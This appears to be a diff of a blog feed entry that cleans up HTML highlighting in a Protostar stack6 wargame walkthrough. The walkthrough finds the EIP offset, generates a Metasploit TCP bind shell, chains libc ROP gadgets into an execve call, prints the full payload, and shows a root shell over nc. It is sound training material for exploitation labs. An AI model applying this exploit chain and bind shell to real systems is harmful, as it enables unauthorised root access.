@@ -39,19 +39,19 @@
 &lt;p&gt;Before we do anything else, let's start off by gaining control over EIP. We'll use Metasploit's &lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; tools to help us figure this one out.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &amp;gt; inputroot@kali:~# gdb -q ./stack6
 Reading symbols from /root/stack6...done.
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;r &amp;lt; input
+gdb$ r &amp;lt; input
 input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Program received signal SIGSEGV, Segmentation fault.
---------------------------------------------------------------------------&lt;span class="o"&gt;[&lt;/span&gt;regs&lt;span class="o"&gt;]&lt;/span&gt;
+--------------------------------------------------------------------------[regs]
   EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
   ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
-  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError &lt;span class="k"&gt;while &lt;/span&gt;running hook_stop:
+  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError while running hook_stop:
 Cannot access memory at address 0x37634136
-0x37634136 in ?? &lt;span class="o"&gt;()&lt;/span&gt;
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;q
+0x37634136 in ?? ()
+gdb$ q
 root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
-&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exact match at offset 80
+[*] Exact match at offset 80
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -59,10 +59,10 @@ root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
 &lt;h2&gt;Plan&lt;/h2&gt;
 &lt;p&gt;Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as &lt;code&gt;/tmp/pwn&lt;/code&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# msfpayload linux/x86/shell_bind_tcp X &amp;gt; linux-bind-shell-tcp
-Created by msfpayload &lt;span class="o"&gt;(&lt;/span&gt;http://www.metasploit.com&lt;span class="o"&gt;)&lt;/span&gt;.
+Created by msfpayload (http://www.metasploit.com).
 Payload: linux/x86/shell_bind_tcp
  Length: 78
-Options: &lt;span class="o"&gt;{}&lt;/span&gt;
+Options: {}
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -85,7 +85,7 @@ Options: &lt;span class="o"&gt;{}&lt;/span&gt;
 &lt;h3&gt;Getting our arguments into memory&lt;/h3&gt;
 &lt;p&gt;First we need to get the arguments to the &lt;code&gt;execve&lt;/code&gt; call into memory. The first argument will point to the string &lt;code&gt;"/bin/pwn"&lt;/code&gt;. We can just use a &lt;code&gt;NULL&lt;/code&gt; for the second and third parameters.&lt;/p&gt;
 &lt;p&gt;We could just pass the parameters in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the &lt;code&gt;.data&lt;/code&gt; section to store these parameters:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;objdump -D /opt/protostar/bin/stack6 | grep __data
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ objdump -D /opt/protostar/bin/stack6 | grep __data
 08049710 &amp;lt;__data_start&amp;gt;:
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -100,37 +100,37 @@ Options: &lt;span class="o"&gt;{}&lt;/span&gt;
 &lt;li&gt;Repeat steps 1 and 2 for successive 4 byte chunks, updating the address &lt;code&gt;[r2]&lt;/code&gt; each time. We can also add a &lt;code&gt;NULL&lt;/code&gt; on the end to terminate the string and provide the &lt;code&gt;NULL&lt;/code&gt; for arguments two and three of the call to &lt;code&gt;execve&lt;/code&gt;.&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Let's look for these gadgets. There's not alot to go on in the &lt;code&gt;stack6&lt;/code&gt; binary itself, so we look in &lt;code&gt;libc&lt;/code&gt; as this is also linked in. We'll start with the &lt;code&gt;mov&lt;/code&gt;, so we an identify which register we need to pop into, then the two &lt;code&gt;pop&lt;/code&gt; gadgets.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot; mov dword \[ecx\]&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot; mov dword \[ecx\]&amp;quot;
 ...
-0x00074997: mov dword &lt;span class="o"&gt;[&lt;/span&gt;ecx&lt;span class="o"&gt;]&lt;/span&gt;, edx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
+0x00074997: mov dword [ecx], edx ; ret  ;  (1 found)
 ...
-user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;pop edx ; ret&amp;quot;&lt;/span&gt;
+user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot;pop edx ; ret&amp;quot;
 ...
-0x00001a9e: pop edx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;6 found&lt;span class="o"&gt;)&lt;/span&gt;
+0x00001a9e: pop edx ; ret  ;  (6 found)
 ...
-user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;pop ecx ; ret&amp;quot;&lt;/span&gt;
+user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot;pop ecx ; ret&amp;quot;
 ...
-0x0013519d: pop ecx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
+0x0013519d: pop ecx ; ret  ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We can get the absolute address of this by adding it to the base address of &lt;code&gt;libc&lt;/code&gt; which we can get from &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/maps&lt;/code&gt; as shown below.  &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;gdb -q /opt/protostar/bin/stack6
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ gdb -q /opt/protostar/bin/stack6
 Reading symbols from /opt/protostar/bin/stack6...done.
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;b main
+gdb$ b main
 Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;r
-Breakpoint 1, main &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x1, &lt;span class="nv"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0xbffff874&lt;span class="o"&gt;)&lt;/span&gt; at stack6/stack6.c:27
+gdb$ r
+Breakpoint 1, main (argc=0x1, argv=0xbffff874) at stack6/stack6.c:27
 27  stack6/stack6.c: No such file or directory.
     in stack6/stack6.c
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;info proc
+gdb$ info proc
 process 2080
-&lt;span class="nv"&gt;cmdline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/protostar/bin/stack6&amp;#39;&lt;/span&gt;
-&lt;span class="nv"&gt;cwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/user&amp;#39;&lt;/span&gt;
-&lt;span class="nv"&gt;exe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/protostar/bin/stack6&amp;#39;&lt;/span&gt;
-gdb&lt;span class="nv"&gt;$ &lt;/span&gt;shell
-&lt;span class="nv"&gt;$ &lt;/span&gt;cat /proc/2080/maps
+cmdline = &amp;#39;/opt/protostar/bin/stack6&amp;#39;
+cwd = &amp;#39;/home/user&amp;#39;
+exe = &amp;#39;/opt/protostar/bin/stack6&amp;#39;
+gdb$ shell
+$ cat /proc/2080/maps
 08048000-08049000 r-xp 00000000 00:10 3537       /opt/protostar/bin/stack6
 08049000-0804a000 rwxp 00000000 00:10 3537       /opt/protostar/bin/stack6
 b7e96000-b7e97000 rwxp 00000000 00:00 0
@@ -140,11 +140,11 @@ b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
 b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
 b7fd9000-b7fdc000 rwxp 00000000 00:00 0
 b7fe0000-b7fe2000 rwxp 00000000 00:00 0
-b7fe2000-b7fe3000 r-xp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/span&gt;vdso&lt;span class="o"&gt;]&lt;/span&gt;
+b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
 b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
 b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
 b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
-bffeb000-c0000000 rwxp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/span&gt;stack&lt;span class="o"&gt;]&lt;/span&gt;
+bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -182,9 +182,9 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/spa
 
 &lt;h3&gt;Setting up the registers&lt;/h3&gt;
 &lt;p&gt;Next step it to place the arguments in the three registers &lt;code&gt;ebx&lt;/code&gt;, &lt;code&gt;ecx&lt;/code&gt; and &lt;code&gt;edx&lt;/code&gt;, so we need to find a &lt;code&gt;pop&lt;/code&gt; for each.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &lt;span class="s2"&gt;&amp;quot; pop ebx&amp;quot;&lt;/span&gt; --color
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &amp;quot; pop ebx&amp;quot; --color
 ...
-0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
+0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -204,61 +204,61 @@ bffeb000-c0000000 rwxp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/spa
 
 &lt;h3&gt;Calling &lt;code&gt;execve&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, &lt;code&gt;libc&lt;/code&gt; contains a gadget that serves both purposes:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;0x0000000B&amp;quot;&lt;/span&gt; ; int 0x80&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ ./rp-lin-x86 -f /lib/libc-2.11.2.so --rop=4 --unique | grep &amp;quot;0x0000000B&amp;quot; ; int 0x80&amp;quot;
 ...
-0x00097193: mov eax, 0x0000000B ; int 0x80 ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
+0x00097193: mov eax, 0x0000000B ; int 0x80 ;  (1 found)
 ...
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Our finished stack layout should look like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data
-&lt;span class="c1"&gt;# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;/tmp&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; First part of our string &lt;span class="o"&gt;/&lt;/span&gt;tmp
-&lt;span class="c1"&gt;# Perform to move from edx to the .data segment&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the next target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049714&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx &lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="s"&gt;&amp;quot;/pwn&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Second part of our string &lt;span class="o"&gt;/&lt;/span&gt;pwn
-&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Load the final target address in .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Load the NULL into edx &lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="kc"&gt;NULL&lt;/span&gt; bytes
-&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="c1"&gt;# Load registers&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f6fa81&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; pop ecx&lt;span class="p"&gt;;&lt;/span&gt; pop ebx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;3&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; edx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;2&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ecx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
-    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;1&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ebx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;
-&lt;span class="c1"&gt;# Call execve&lt;/span&gt;
-    &lt;span class="mh"&gt;0xb7f2e193&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return Address &lt;span class="p"&gt;(&lt;/span&gt;second ROP gadget&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;span class="kc"&gt;...&lt;/span&gt;
-&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&amp;lt;lower memory&amp;gt;
+...
+# Load the target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049710 &amp;lt;- Target memory address in .data
+# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    &amp;quot;/tmp&amp;quot; &amp;lt;- First part of our string /tmp
+# Perform to move from edx to the .data segment
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+# Load the next target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049714 &amp;lt;- Target memory address in .data + 4 bytes
+# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx 
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    &amp;quot;/pwn&amp;quot; &amp;lt;- Second part of our string /pwn
+# Perform the move to .data
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+# Load the final target address in .data
+    0xb7fcc19d &amp;lt;- Return address (pop ecx; ret)
+    0x08049718 &amp;lt;- Target memory address in .data + 4 bytes
+# Load the NULL into edx 
+    0xb7e98a9e &amp;lt;- Return address (pop edx; ret)
+    0x00000000 &amp;lt;- NULL bytes
+# Perform the move to .data
+    0xb7f0b997 &amp;lt;- Return address (mov dword [ecx], edx; ret)
+# Load registers
+    0xb7f6fa81 &amp;lt;- Return address (pop edx; pop ecx; pop ebx; ret)
+    0x08049718 &amp;lt;- Argument 3 destined for edx - address of NULL
+    0x08049718 &amp;lt;- Argument 2 destined for ecx - address of NULL
+    0x08049710 &amp;lt;- Argument 1 destined for ebx - address of &amp;quot;/tmp/pwn&amp;quot;
+# Call execve
+    0xb7f2e193 &amp;lt;- Return Address (second ROP gadget)
+...
+&amp;lt;higher memory&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;This now gives us the following payload:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*80 + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/tmp&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x14\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/pwn&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;\x00\x00\x00\x00&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x81\xfa\xf6\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x93\xe1\xf2\xb7&amp;quot;&amp;#39;&lt;/span&gt; &amp;gt; input
-user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;cat input | /opt/protostar/bin/stack6
+&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~$ python -c &amp;#39;print &amp;quot;A&amp;quot;*80 + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/tmp&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x14\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;/pwn&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x9d\xc1\xfc\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x9e\x8a\xe9\xb7&amp;quot; + &amp;quot;\x00\x00\x00\x00&amp;quot; + &amp;quot;\x97\xb9\xf0\xb7&amp;quot; + &amp;quot;\x81\xfa\xf6\xb7&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x18\x97\x04\x08&amp;quot; + &amp;quot;\x10\x97\x04\x08&amp;quot; + &amp;quot;\x93\xe1\xf2\xb7&amp;quot;&amp;#39; &amp;gt; input
+user@protostar:~$ cat input | /opt/protostar/bin/stack6
 input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAA������/tmp��������/pwn�������
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And from another shell:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;nc 192.168.94.133 4444
+&lt;div class="highlight"&gt;&lt;pre&gt;$ nc 192.168.94.133 4444
 whoami
 root
 &lt;/pre&gt;&lt;/div&gt;</summary></entry></feed>
